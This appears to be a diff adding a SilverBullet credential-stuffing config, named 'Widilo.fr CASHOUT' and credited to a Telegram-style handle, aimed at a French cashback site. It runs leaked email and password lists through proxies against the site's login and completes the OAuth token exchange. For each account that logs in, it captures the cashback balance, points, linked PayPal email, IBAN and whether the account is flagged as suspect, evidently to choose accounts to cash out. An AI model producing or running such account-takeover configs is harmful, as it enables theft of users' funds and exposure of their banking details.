@@ -1,0 +1,267 @@
+[SETTINGS]
+{
+  "Name": "Widilo.fr CASHOUT",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2023-12-29T03:43:40.7932901+04:00",
+  "AdditionalInfo": "FR combos",
+  "RequiredPlugins": [],
+  "Author": "🔥 @svbconfigmaker 🔥",
+  "Version": "1.1.3 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "Default",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Widilo",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST GET "https://login.widilo.fr/Account/Login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"" "\" />" -> VAR "RT" 
+
+REQUEST POST "https://login.widilo.fr/Account/Login?returnurl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dangular%26redirect_uri%3Dhttps%253A%252F%252Fwww.widilo.fr%252Fcallback%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520email%2520authentication%2520data%2520browserextension%2520realtime%26nonce%3D8f82ceb4fdc1c8b478855c6fefc075d187wvT5nTw%26state%3D36e3f8e5aa762801117f56ed55838e2587GaykGUE%26code_challenge%3D68PAxWUE8q9J8_5lPnQr-j2nIuLTwDwBjbhajZXQHGY%26code_challenge_method%3DS256%26currentUrl%3D%252F%26registrationShopType%3D0%26hasConfirmedEmail%3Dfalse" 
+  CONTENT "Email=<USER>&Password=<PASS>&button=login&__RequestVerificationToken=<RT>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.widilo.fr" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-MU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 250" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Origin: https://login.widilo.fr" 
+  HEADER "Referer: <ADDRESS>" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Email ou mot de passe invalide" 
+  KEYCHAIN Success OR 
+    KEY "<HEADERS(Location)>" Contains "ttps://www.widilo.fr/callback?code=" 
+    KEY "<ADDRESS>" Contains "ttps://www.widilo.fr/callback?code=" 
+    KEY "302 Found" 
+
+PARSE "<ADDRESS>" LR "https://www.widilo.fr/callback?code=" "&" -> VAR "CODE" 
+
+PARSE "<ADDRESS>" LR "&state=" "&" -> VAR "STATE" 
+
+PARSE "<ADDRESS>" LR "&session_state=" "" -> VAR "SESS" 
+
+REQUEST GET "<ADDRESS>" 
+  
+  HEADER "Host: www.widilo.fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "DNT: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Service-Worker-Navigation-Preload: true" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://login.widilo.fr/" 
+  HEADER "Accept-Language: en-MU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+PARSE "<COOKIES(XSRF-TOKEN)>" LR "" "" -> VAR "XSRF" 
+
+!REQUEST POST "https://login.widilo.fr/connect/token" 
+!  CONTENT "grant_type=authorization_code&client_id=angular&code_verifier=cad7bfac6397debc10212f099b8c92fe934290e38ba797ced013ba93dea2bL5r5IB&code=8F197EA1F91D1A8D2D545AA8E26E6A4FC18E96586AA464A3FA94A845851305D5&redirect_uri=https%3A%2F%2Fwww.widilo.fr%2Fcallback" 
+!  CONTENTTYPE "application/x-www-form-urlencoded" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: application/json, text/plain, */*" 
+!  HEADER "Host: login.widilo.fr" 
+!  HEADER "Connection: keep-alive" 
+!  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" 
+!  HEADER "DNT: 1" 
+!  HEADER "sec-ch-ua-mobile: ?0" 
+!  HEADER "Content-Type: application/x-www-form-urlencoded" 
+!  HEADER "Access-Control-Allow-Origin: https://www.widilo.fr" 
+!  HEADER "sec-ch-ua-platform: \"Windows\"" 
+!  HEADER "Origin: https://www.widilo.fr" 
+!  HEADER "Sec-Fetch-Site: same-site" 
+!  HEADER "Sec-Fetch-Mode: cors" 
+!  HEADER "Sec-Fetch-Dest: empty" 
+!  HEADER "Referer: https://www.widilo.fr/" 
+!  HEADER "Accept-Language: en-MU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
+!  HEADER "Accept-Encoding: gzip, deflate" 
+!  HEADER "Content-Length: 251" 
+
+REQUEST POST "https://login.widilo.fr/connect/token" 
+  CONTENT "grant_type=authorization_code&client_id=angular&code_verifier=cad7bfac6397debc10212f099b8c92fe934290e38ba797ced013ba93dea2bL5r5IB&code=<CODE>&redirect_uri=https%3A%2F%2Fwww.widilo.fr%2Fcallback" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.widilo.fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" 
+  HEADER "DNT: 1" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Access-Control-Allow-Origin: https://www.widilo.fr" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://www.widilo.fr" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.widilo.fr/" 
+  HEADER "Accept-Language: en-MU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 251" 
+
+PARSE "<SOURCE>" LR "{\"id_token\":\"" "\"" -> VAR "TOK1" 
+
+PARSE "<SOURCE>" LR "\"access_token\":\"" "\"" -> VAR "TOK2" 
+
+REQUEST GET "https://data-api.widilo.fr/api/user/balance/" 
+  
+  HEADER "Host: data-api.widilo.fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" 
+  HEADER "DNT: 1" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Authorization: Bearer <TOK2>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Access-Control-Allow-Origin: https://www.widilo.fr" 
+  HEADER "Accept: application/json" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://www.widilo.fr" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.widilo.fr/" 
+  HEADER "Accept-Language: en-MU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+!PARSE "<SOURCE>" JSON "totalAmount" -> VAR "totalAmount" 
+
+PARSE "<SOURCE>" JSON "approvedAmount" CreateEmpty=FALSE -> CAP "Cashback Balance" 
+
+REQUEST GET "https://data-api.widilo.fr/api/user/gamification/shop" 
+  
+  HEADER "Host: data-api.widilo.fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" 
+  HEADER "DNT: 1" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Authorization: Bearer <TOK2>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Access-Control-Allow-Origin: https://www.widilo.fr" 
+  HEADER "Accept: application/json" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://www.widilo.fr" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.widilo.fr/" 
+  HEADER "Accept-Language: en-MU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "balancePoint" CreateEmpty=FALSE -> CAP "Points" 
+
+REQUEST GET "https://data-api.widilo.fr/api/user/payment/infos" 
+  
+  HEADER "Host: data-api.widilo.fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" 
+  HEADER "DNT: 1" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Authorization: Bearer <TOK2>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Access-Control-Allow-Origin: https://www.widilo.fr" 
+  HEADER "Accept: application/json" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://www.widilo.fr" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.widilo.fr/" 
+  HEADER "Accept-Language: en-MU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "canRequestPaypalPayment" CreateEmpty=FALSE -> CAP "canRequestPaypalPayment" 
+
+PARSE "<SOURCE>" JSON "lastPaymentWasPaypal" CreateEmpty=FALSE -> CAP "lastPaymentWasPaypal" 
+
+PARSE "<SOURCE>" JSON "lastPaymentWasBankTransfer" CreateEmpty=FALSE -> CAP "lastPaymentWasBankTransfer" 
+
+PARSE "<SOURCE>" JSON "existingPaypalEmail" CreateEmpty=FALSE -> CAP "existingPaypalEmail" 
+
+PARSE "<SOURCE>" JSON "isSuspect" CreateEmpty=FALSE -> CAP "isSuspect" 
+
+PARSE "<SOURCE>" JSON "hasOngoingPayment" CreateEmpty=FALSE -> CAP "hasOngoingPayment" 
+
+PARSE "<SOURCE>" JSON "hasAlreadyAskPayment" CreateEmpty=FALSE -> CAP "hasAlreadyAskPayment" 
+
+PARSE "<SOURCE>" JSON "existingIban" CreateEmpty=FALSE -> CAP "IBAN" 
+
+FUNCTION Constant "🔥 @svbconfigmaker 🔥" -> CAP "Config By " 
+
